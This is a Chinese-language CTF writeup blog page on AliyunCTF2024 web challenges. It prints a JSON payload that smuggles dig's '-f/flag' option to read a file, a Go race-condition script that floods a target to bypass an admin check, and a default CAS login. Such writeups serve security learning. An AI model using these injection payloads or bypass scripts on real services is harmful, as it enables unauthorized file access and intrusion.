@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="writeup.ctfWeb签到命令注入题目，发 POST 请求时添加 -f 参数就能读取 &#x2F;flag： 1&#123;&quot;domain&quot;:&quot;a.a&quot;, &quot;type&quot;:&quot;-f&#x2F;flag&quot;&#125;  Pastbin出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AliyunCTF2024 Writeup">
+<meta property="og:url" content="https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/index.html">
+<meta property="og:site_name" content="阿菇の博客">
+<meta property="og:description" content="writeup.ctfWeb签到命令注入题目，发 POST 请求时添加 -f 参数就能读取 &#x2F;flag： 1&#123;&quot;domain&quot;:&quot;a.a&quot;, &quot;type&quot;:&quot;-f&#x2F;flag&quot;&#125;  Pastbin出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-02T07:21:22.215Z">
+<meta property="article:author" content="阿菇kinoko">
+<meta property="article:tag" content="ma5hr00m,kinoko,阿菇kinoko,blog,博客,博文">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>AliyunCTF2024 Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="阿菇の博客" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">📄首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">📂归档</a></li><!--
+     --><!--
+       --><li><a href="/friends/">👫友链</a></li><!--
+     --><!--
+       --><li><a href="/categories/">🗂️分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">🏷️标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">🌸关于</a></li><!--
+     --><!--
+       --><li><a href="/log/">📖日志</a></li><!--
+     --><!--
+       --><li><a href="/search/">🔍搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/05/21/hello-web/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/02/19/overview-of-nginx-process-model/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&text=AliyunCTF2024 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&is_video=false&description=AliyunCTF2024 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AliyunCTF2024 Writeup&body=Check out this article: https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&name=AliyunCTF2024 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&t=AliyunCTF2024 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#writeup-ctf"><span class="toc-number">1.</span> <span class="toc-text">writeup.ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pastbin"><span class="toc-number">1.2.</span> <span class="toc-text">Pastbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyCAS"><span class="toc-number">1.3.</span> <span class="toc-text">easyCAS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#About-ctf"><span class="toc-number">2.</span> <span class="toc-text">About.ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Web 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pastbin-1"><span class="toc-number">2.2.</span> <span class="toc-text">Pastbin</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        AliyunCTF2024 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">阿菇kinoko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-20T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-04-21</time>
+        
+        (Updated: <time datetime="2025-01-02T07:21:22.215Z" class="dt-updated" itemprop="dateModified">2025-01-02</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="writeup-ctf"><a href="#writeup-ctf" class="headerlink" title="writeup.ctf"></a>writeup.ctf</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>命令注入题目，发 POST 请求时添加 <code>-f</code> 参数就能读取 <code>/flag</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;-f/flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Pastbin"><a href="#Pastbin" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice，导致 <code>c.mws</code> 可以被其他 goroutine 污染，也就是在 append 时实现数据竞争。</p>
+<blockquote>
+<p>之前对 Golang 的关注点一直在怎么用来写服务上，对于框架本身研究很渣，做题的时候也是在找有没有一些逻辑漏洞，盯着中间件这些瞎看，没什么成果。后来 Baimeow 上线看 Router 部分找到了这个公用 slice，搓了个脚本打出来了 flag.</p>
+</blockquote>
+<p>刚开始在源码里看到下面这段代码，想着是不是要选手去打 JWT，讨论之后发现走不通。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// No matter what the password is, you can not log in as admin</span></span><br><span class="line"><span class="comment">//// I think</span></span><br></pre></td></tr></table></figure>
+
+<p>服务里有个鉴权中间件 <code>secureFlagMiddleware</code>，当用户访问 <code>/flag</code> 时会检查请求 token 里是否有 admin，如果没有会删掉返回值中的 flag 字段。然后在框架的 <code>Handle()</code> 函数中，可以发现这里有一个 <code>append</code> 操作，而 <code>c.mws</code> 在底层是被所有路由共用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// mws=&#123;[]func(http.Handler) http.Handler&#125;</span><br><span class="line"></span><br><span class="line">func (rtr *Router) Handle(method string, pattern string, handlers []Handler) &#123;</span><br><span class="line">    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">       c := rtr.m.createContext(resp, req)</span><br><span class="line">       for _, h := range handlers &#123;</span><br><span class="line">          c.mws = append(c.mws, getMWFromHandler(h))</span><br><span class="line">       &#125;</span><br><span class="line">       c.run()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这块再结合鉴权用中间件，思路就出来了：我们可以构造三个请求，让第一个非 <code>/flag</code> 请求的后两个 Handler 被第二个 <code>/flag</code> 请求覆盖，再发第三个请求覆盖 <code>/flag</code> 的第一个 Handler 取消 adminOnly 的限制，这样就能实现绕过 <code>secureFlagMiddleware</code> 获取 flag。</p>
+<p>之后 Baimeow 搓了个脚本：</p>
+<blockquote>
+<p>“触发条件比较苛刻，脚本有点讲究的，必须让最大量的流量在路由部分，且保持两类流量比例”</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var url = &quot;TARGET_IP&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    limiter1 := make(chan struct&#123;&#125;, 64)</span><br><span class="line">    limiter2 := make(chan struct&#123;&#125;, 32)</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          &lt;-limiter2</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    var i = 0</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter2 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          i++</span><br><span class="line">          fmt.Println(&quot;try&quot;, i)</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendFlag() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    select &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendSlash() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendFlag() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/flag&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkBody(rd io.Reader) bool &#123;</span><br><span class="line">    data, _ := io.ReadAll(rd)</span><br><span class="line">    if data == nil &#123;</span><br><span class="line">       return false</span><br><span class="line">    &#125;</span><br><span class="line">    if strings.Contains(string(data), &quot;aliyunctf&#123;&quot;) &#123;</span><br><span class="line">       fmt.Println(string(data))</span><br><span class="line">       return true</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以关注下脚本中高亮的部分，是基于 channel 实现的限流器，如上文所说将 <code>/</code> 和 <code>/flag</code> 的请求比例控制在 2:1。</p>
+<p>:::info 具体是如何控制不同请求比例的呢？</p>
+<p><code>limiter1</code> 和 <code>limiter2</code> 是两个无缓冲的通道，它们的容量分别为 64 和 32。这意味着这两个通道最多可以同时容纳 64 和 32 个空结构体。</p>
+<p>当一个 goroutine 尝试向一个已满的通道发送数据时，这个 goroutine 会被阻塞，直到有其他 goroutine 从该通道接收数据，使得通道有足够的空间来存放新的数据。</p>
+<p>同样，当一个 goroutine 尝试从一个空的通道接收数据时，这个 goroutine 也会被阻塞，直到有其他 goroutine 向该通道发送数据。</p>
+<p>因此，这两个通道就像是两个限流器，它们限制了同时运行的 <code>SendSlash()</code> 和 <code>SendFlag()</code> 的数量。当这两个函数的数量达到通道的容量时，新的函数调用会被阻塞，直到有正在运行的函数完成。</p>
+<p>:::</p>
+<h3 id="easyCAS"><a href="#easyCAS" class="headerlink" title="easyCAS"></a>easyCAS</h3><blockquote>
+<p>怎么网上都是 4.X 的漏洞，版本 5.X 没漏洞了吗，可是都是六年前的了，真的没问题吗，不管了，那我就搭起来看看吧，反正没漏洞密码也懒得改了。嗷~对了，还要调一下代码，开一下调试功能。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/apereo/cas">CAS 项目地址</a>，题目环境对应版本源码：<a target="_blank" rel="noopener" href="https://github.com/apereo/cas-overlay-template/tree/5.3">release 5.3.16</a>，可以在本地起环境。</p>
+<p>有了源码之后可以在配置文件中遭到默认用户密码，直接可以登进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./gradlew duct</span><br><span class="line">    -Pduct.cas.1=https://node1.example.org/cas \</span><br><span class="line">    -Pduct.cas.2=https://node2.example.org/cas \</span><br><span class="line">    -Pduct.cas.3=https://node3.example.org/cas \</span><br><span class="line">    -Pduct.cas.4=https://node4.example.org/cas \</span><br><span class="line">    -Pduct.service=https://apereo.github.io \</span><br><span class="line">    -Pduct.username=casuser \</span><br><span class="line">    -Pduct.password=Mellon</span><br></pre></td></tr></table></figure>
+
+<p>:::danger</p>
+<p>Working in progress…</p>
+<p>:::</p>
+<h2 id="About-ctf"><a href="#About-ctf" class="headerlink" title="About.ctf"></a>About.ctf</h2><h3 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web 签到"></a>Web 签到</h3><p>搞过 Web 开发的肯定都了解 CDN。全称 Content Delivery Network，即内容分发网络，这种技术通过在全球多个地点部署服务器节点来优化内容的交付。这些节点缓存网页静态资源，使得用户可以从地理上更接近自己的位置获取这些内容，从而减少延迟，提高加载速度和用户体验。</p>
+<p>:::tip CDN的工作原理</p>
+<p>当用户请求特定的内容时，CDN 的 DNS 系统会将请求重定向到最近的服务器节点。这个节点会提供请求的内容，如果该节点没有缓存该内容，它会从源服务器或其他节点获取内容，然后提供给用户。这个过程减少了数据传输的距离，提高了速度和效率。</p>
+<p>:::</p>
+<p>在处理 CDN 时，我们就常用 <code>dig</code>，因为它可以帮助我们验证 CDN 的 DNS 配置和性能。</p>
+<p><code>dig</code> 本质上是个 DNS 查询工具，并不是为了 CDN 技术而开发，但它确实能帮开发者们获取 CDN 相关信息，比如查询 CDN 缓存状态、检测性能以及排查问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [server] [name] [type]</span><br></pre></td></tr></table></figure>
+
+<p>最简单的使用就是后面跟 domain，这里以该站点域名为例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dig ma5hr00m.top</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--------------</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; ma5hr00m.top</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24018</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;ma5hr00m.top.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">ma5hr00m.top.           600     IN      A       123.206.118.236</span><br><span class="line"></span><br><span class="line">;; Query time: 252 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)</span><br><span class="line">;; WHEN: Tue May 07 20:40:39 CST 2024</span><br><span class="line">;; MSG SIZE  rcvd: 5</span><br></pre></td></tr></table></figure>
+
+<p>其他细致用法去看 help 文档。这道题目里是利用了 <code>-f</code> 参数，当 dig 使用该参数时，可以从指定文件中读取 domain 列表并逐个查询，利用这个参数就能读取指定文件内容。</p>
+<h3 id="Pastbin-1"><a href="#Pastbin-1" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>Pastebin 是一种常见的在线内容托管服务，它允许用户在网站上存储（粘贴）纯文本，如代码片段，并生成一个网址。打开这个网址就可以看到对应的文字。这个服务通常用于快速共享文本或代码片段，尤其是在开发社区中非常流行。用户可以选择文本的类型（例如代码所属的编程语言）、保存时间（如 1 天、7 天、30 天或阅后即销毁等）以及分享者的昵称等信息。</p>
+<blockquote>
+<p>说实话没用过，感觉这个需求直接被开发文档给吃掉了，没什么必要搞这种服务。</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">📄首页</a></li>
+        
+          <li><a href="/archives/">📂归档</a></li>
+        
+          <li><a href="/friends/">👫友链</a></li>
+        
+          <li><a href="/categories/">🗂️分类</a></li>
+        
+          <li><a href="/tags/">🏷️标签</a></li>
+        
+          <li><a href="/about/">🌸关于</a></li>
+        
+          <li><a href="/log/">📖日志</a></li>
+        
+          <li><a href="/search/">🔍搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#writeup-ctf"><span class="toc-number">1.</span> <span class="toc-text">writeup.ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pastbin"><span class="toc-number">1.2.</span> <span class="toc-text">Pastbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyCAS"><span class="toc-number">1.3.</span> <span class="toc-text">easyCAS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#About-ctf"><span class="toc-number">2.</span> <span class="toc-text">About.ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Web 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pastbin-1"><span class="toc-number">2.2.</span> <span class="toc-text">Pastbin</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&text=AliyunCTF2024 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&is_video=false&description=AliyunCTF2024 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AliyunCTF2024 Writeup&body=Check out this article: https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&title=AliyunCTF2024 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&name=AliyunCTF2024 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.kinoko.fun/2024/04/21/aliyunctf-2024/&t=AliyunCTF2024 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
